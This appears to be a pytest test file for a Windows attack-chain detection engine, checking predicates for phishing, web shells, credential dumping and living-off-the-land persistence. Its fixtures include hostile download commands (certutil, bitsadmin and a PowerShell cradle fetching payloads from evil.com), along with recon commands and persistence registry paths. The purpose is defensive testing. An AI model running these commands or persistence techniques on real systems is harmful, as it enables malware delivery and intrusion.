"""Unit tests for declarative attack chain definitions and stage predicates."""

from __future__ import annotations

from datetime import datetime, timezone

import pytest

from app.correlation.chains import (
    CHAIN_CREDDUMP_LAT,
    CHAIN_LOTL_PERSIST,
    CHAIN_PHISH,
    CHAIN_WEBSHELL,
    CORE_ATTACK_CHAINS,
    get_default_attack_chains,
    is_egress_or_persistence,
    is_lolbin_download,
    is_lsass_access,
    is_persistence_installation,
    is_phishing_root,
    is_recon_command,
    is_recon_or_persistence,
    is_rfc1918_egress_or_remote_exec,
    is_script_interpreter,
    is_suspicious_file_drop,
    is_web_server_root,
)
from app.models.events import EventCategory, NormalizedEvent


def make_event(**kwargs) -> NormalizedEvent:
    defaults = {
        "event_id": 1,
        "record_id": 100,
        "event_hash": "a" * 64,
        "provider": "Microsoft-Windows-Sysmon",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "computer": "WORKSTATION-01",
        "timestamp": datetime(2026, 11, 4, 12, 0, 0, tzinfo=timezone.utc),
        "event_category": EventCategory.PROCESS,
        "event_type": "PROCESS_CREATE",
        "raw_payload": "{}",
    }
    defaults.update(kwargs)
    return NormalizedEvent(**defaults)


# =============================================================================
# Chain 1 Predicate Tests: Phishing / Malicious Document
# =============================================================================

def test_is_phishing_root() -> None:
    """Verify is_phishing_root detects document software."""
    ev_word = make_event(image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE")
    ev_excel = make_event(image=r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE")
    ev_acrobat = make_event(image=r"C:\Program Files\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe")
    ev_benign = make_event(image=r"C:\Windows\System32\notepad.exe")

    assert is_phishing_root(ev_word) is True
    assert is_phishing_root(ev_excel) is True
    assert is_phishing_root(ev_acrobat) is True
    assert is_phishing_root(ev_benign) is False


def test_is_script_interpreter() -> None:
    """Verify is_script_interpreter detects script and shell interpreters."""
    ev_pwsh = make_event(image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")
    ev_cmd = make_event(image=r"C:\Windows\System32\cmd.exe")
    ev_mshta = make_event(image=r"C:\Windows\System32\mshta.exe")
    ev_cscript = make_event(image=r"C:\Windows\System32\cscript.exe")
    ev_benign = make_event(image=r"C:\Windows\explorer.exe")

    assert is_script_interpreter(ev_pwsh) is True
    assert is_script_interpreter(ev_cmd) is True
    assert is_script_interpreter(ev_mshta) is True
    assert is_script_interpreter(ev_cscript) is True
    assert is_script_interpreter(ev_benign) is False


def test_is_egress_or_persistence() -> None:
    """Verify is_egress_or_persistence detects network egress or persistence."""
    ev_net = make_event(
        event_id=3,
        event_category=EventCategory.NETWORK,
        event_type="NETWORK_CONNECT",
        destination_ip="198.51.100.42",
        destination_port=443,
    )
    ev_loopback = make_event(
        event_id=3,
        event_category=EventCategory.NETWORK,
        event_type="NETWORK_CONNECT",
        destination_ip="127.0.0.1",
        destination_port=8080,
    )
    ev_run_key = make_event(
        event_id=13,
        event_category=EventCategory.REGISTRY,
        event_type="SET_VALUE",
        registry_target_object=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Backdoor",
    )
    ev_task = make_event(
        event_id=4698,
        event_category=EventCategory.SECURITY,
        event_type="TASK_CREATED",
    )
    ev_benign = make_event(
        event_id=1,
        event_category=EventCategory.PROCESS,
        image=r"C:\Windows\System32\whoami.exe",
    )

    assert is_egress_or_persistence(ev_net) is True
    assert is_egress_or_persistence(ev_loopback) is False
    assert is_egress_or_persistence(ev_run_key) is True
    assert is_egress_or_persistence(ev_task) is True
    assert is_egress_or_persistence(ev_benign) is False


# =============================================================================
# Chain 2 Predicate Tests: Web Shell / Server Exploitation
# =============================================================================

def test_is_web_server_root() -> None:
    """Verify is_web_server_root detects web server daemon processes."""
    ev_iis = make_event(image=r"C:\Windows\System32\inetsrv\w3wp.exe")
    ev_apache = make_event(image=r"C:\Apache24\bin\httpd.exe")
    ev_nginx = make_event(image=r"C:\nginx\nginx.exe")
    ev_tomcat = make_event(image=r"C:\Tomcat9\bin\tomcat9.exe")
    ev_java_server = make_event(
        image=r"C:\Java\bin\java.exe",
        command_line="java.exe -jar spring-boot-app.jar --server.port=8080",
    )
    ev_benign = make_event(image=r"C:\Program Files\Google\Chrome\chrome.exe")

    assert is_web_server_root(ev_iis) is True
    assert is_web_server_root(ev_apache) is True
    assert is_web_server_root(ev_nginx) is True
    assert is_web_server_root(ev_tomcat) is True
    assert is_web_server_root(ev_java_server) is True
    assert is_web_server_root(ev_benign) is False


def test_is_recon_command_and_recon_or_persistence() -> None:
    """Verify is_recon_command and is_recon_or_persistence identify recon binaries."""
    ev_whoami = make_event(image=r"C:\Windows\System32\whoami.exe")
    ev_net = make_event(image=r"C:\Windows\System32\net.exe", command_line="net user")
    ev_nltest = make_event(image=r"C:\Windows\System32\nltest.exe", command_line="nltest /dclist:")
    ev_benign = make_event(image=r"C:\Windows\notepad.exe")

    assert is_recon_command(ev_whoami) is True
    assert is_recon_command(ev_net) is True
    assert is_recon_command(ev_nltest) is True
    assert is_recon_command(ev_benign) is False

    # is_recon_or_persistence
    assert is_recon_or_persistence(ev_whoami) is True
    ev_task = make_event(event_id=4698, event_category=EventCategory.SECURITY)
    assert is_recon_or_persistence(ev_task) is True


# =============================================================================
# Chain 3 Predicate Tests: Credential Dumping to Lateral Movement
# =============================================================================

def test_is_lsass_access() -> None:
    """Verify is_lsass_access identifies suspicious LSASS access rights or injection."""
    ev_access_suspicious = make_event(
        event_id=10,
        event_category=EventCategory.PROCESS_ACCESS,
        target_image=r"C:\Windows\System32\lsass.exe",
        granted_access="0x1010",
    )
    ev_access_all = make_event(
        event_id=10,
        event_category=EventCategory.PROCESS_ACCESS,
        target_image=r"C:\Windows\System32\lsass.exe",
        granted_access="0x1FFFFF",
    )
    ev_remote_thread = make_event(
        event_id=8,
        event_category=EventCategory.REMOTE_THREAD,
        target_image=r"C:\Windows\System32\lsass.exe",
    )
    ev_benign_access = make_event(
        event_id=10,
        event_category=EventCategory.PROCESS_ACCESS,
        target_image=r"C:\Windows\explorer.exe",
        granted_access="0x1410",
    )

    assert is_lsass_access(ev_access_suspicious) is True
    assert is_lsass_access(ev_access_all) is True
    assert is_lsass_access(ev_remote_thread) is True
    assert is_lsass_access(ev_benign_access) is False


def test_is_rfc1918_egress_or_remote_exec() -> None:
    """Verify is_rfc1918_egress_or_remote_exec detects private IP connections or service creation."""
    ev_10_net = make_event(
        event_id=3,
        event_category=EventCategory.NETWORK,
        destination_ip="10.0.1.50",
        destination_port=445,
    )
    ev_172_net = make_event(
        event_id=3,
        event_category=EventCategory.NETWORK,
        destination_ip="172.16.5.10",
        destination_port=135,
    )
    ev_192_net = make_event(
        event_id=3,
        event_category=EventCategory.NETWORK,
        destination_ip="192.168.1.100",
        destination_port=3389,
    )
    ev_public_net = make_event(
        event_id=3,
        event_category=EventCategory.NETWORK,
        destination_ip="8.8.8.8",
        destination_port=53,
    )
    ev_loopback = make_event(
        event_id=3,
        event_category=EventCategory.NETWORK,
        destination_ip="127.0.0.1",
        destination_port=80,
    )
    ev_service = make_event(
        event_id=4697,
        event_category=EventCategory.SECURITY,
        service_name="PSEXESVC",
    )

    assert is_rfc1918_egress_or_remote_exec(ev_10_net) is True
    assert is_rfc1918_egress_or_remote_exec(ev_172_net) is True
    assert is_rfc1918_egress_or_remote_exec(ev_192_net) is True
    assert is_rfc1918_egress_or_remote_exec(ev_public_net) is False
    assert is_rfc1918_egress_or_remote_exec(ev_loopback) is False
    assert is_rfc1918_egress_or_remote_exec(ev_service) is True


# =============================================================================
# Chain 4 Predicate Tests: Living-off-the-Land to Persistence
# =============================================================================

def test_is_lolbin_download() -> None:
    """Verify is_lolbin_download detects certutil, bitsadmin, and cradle downloads."""
    ev_certutil = make_event(
        image=r"C:\Windows\System32\certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\p.exe",
    )
    ev_bitsadmin = make_event(
        image=r"C:\Windows\System32\bitsadmin.exe",
        command_line="bitsadmin /transfer myjob http://evil.com/mal.dll C:\\ProgramData\\mal.dll",
    )
    ev_pwsh_cradle = make_event(
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        command_line="powershell.exe -w hidden (New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')",
    )
    ev_certutil_benign = make_event(
        image=r"C:\Windows\System32\certutil.exe",
        command_line="certutil -dump mycert.cer",
    )

    assert is_lolbin_download(ev_certutil) is True
    assert is_lolbin_download(ev_bitsadmin) is True
    assert is_lolbin_download(ev_pwsh_cradle) is True
    assert is_lolbin_download(ev_certutil_benign) is False


def test_is_suspicious_file_drop() -> None:
    """Verify is_suspicious_file_drop identifies executable drops in writable paths."""
    ev_temp_exe = make_event(
        event_id=11,
        event_category=EventCategory.FILE,
        target_filename=r"C:\Users\victim\AppData\Local\Temp\beacon.exe",
    )
    ev_public_dll = make_event(
        event_id=11,
        event_category=EventCategory.FILE,
        target_filename=r"C:\Users\Public\loader.dll",
    )
    ev_programdata_vbs = make_event(
        event_id=11,
        event_category=EventCategory.FILE,
        target_filename=r"C:\ProgramData\script.vbs",
    )
    ev_benign_text = make_event(
        event_id=11,
        event_category=EventCategory.FILE,
        target_filename=r"C:\Users\victim\AppData\Local\Temp\log.txt",
    )
    ev_system_file = make_event(
        event_id=11,
        event_category=EventCategory.FILE,
        target_filename=r"C:\Windows\System32\calc.exe",
    )

    assert is_suspicious_file_drop(ev_temp_exe) is True
    assert is_suspicious_file_drop(ev_public_dll) is True
    assert is_suspicious_file_drop(ev_programdata_vbs) is True
    assert is_suspicious_file_drop(ev_benign_text) is False
    assert is_suspicious_file_drop(ev_system_file) is False


def test_is_persistence_installation() -> None:
    """Verify is_persistence_installation detects Run keys, IFEO, tasks, services."""
    ev_run = make_event(
        event_id=13,
        event_category=EventCategory.REGISTRY,
        registry_target_object=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater",
    )
    ev_ifeo = make_event(
        event_id=12,
        event_category=EventCategory.REGISTRY,
        registry_target_object=r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger",
    )
    ev_task = make_event(event_id=4698, event_category=EventCategory.SECURITY)
    ev_service = make_event(event_id=4697, event_category=EventCategory.SECURITY)
    ev_benign = make_event(
        event_id=13,
        event_category=EventCategory.REGISTRY,
        registry_target_object=r"HKCU\Software\MyCompany\App\Setting",
    )

    assert is_persistence_installation(ev_run) is True
    assert is_persistence_installation(ev_ifeo) is True
    assert is_persistence_installation(ev_task) is True
    assert is_persistence_installation(ev_service) is True
    assert is_persistence_installation(ev_benign) is False


# =============================================================================
# Chain Definition Structure & Default Chains
# =============================================================================

def test_get_default_attack_chains() -> None:
    """Verify all 4 default attack chains are present and structurally valid."""
    chains = get_default_attack_chains()
    assert len(chains) == 4
    chain_ids = [c.chain_id for c in chains]
    assert "CHAIN-PHISH-001" in chain_ids
    assert "CHAIN-WEBSHELL-001" in chain_ids
    assert "CHAIN-CREDDUMP-LAT-001" in chain_ids
    assert "CHAIN-LOTL-PERSIST-001" in chain_ids

    for chain in chains:
        assert chain.window_minutes == 30
        assert len(chain.mitre_tactics) > 0
        assert len(chain.mitre_techniques) > 0
        assert len(chain.stages) >= 2
        assert len(chain.investigation_steps) > 0

        # Verify stages are strictly sequential starting from 1
        for idx, stage in enumerate(chain.stages, start=1):
            assert stage.stage_number == idx
            assert stage.stage_name != ""
            assert stage.tactic != ""
            assert stage.technique != ""


def test_chain_stage_definition_matching() -> None:
    """Verify ChainStageDefinition matches_event and matches_match evaluate accurately."""
    s1 = CHAIN_PHISH.stages[0]
    ev_word = make_event(image=r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE")
    ev_notepad = make_event(image=r"C:\Windows\notepad.exe")

    assert s1.matches_event(ev_word) is True
    assert s1.matches_event(ev_notepad) is False

    # matches_match check
    class MockMatch:
        mitre_tactics = ["Initial Access"]
        mitre_techniques = ["T1204.002"]

    assert s1.matches_match(MockMatch()) is True
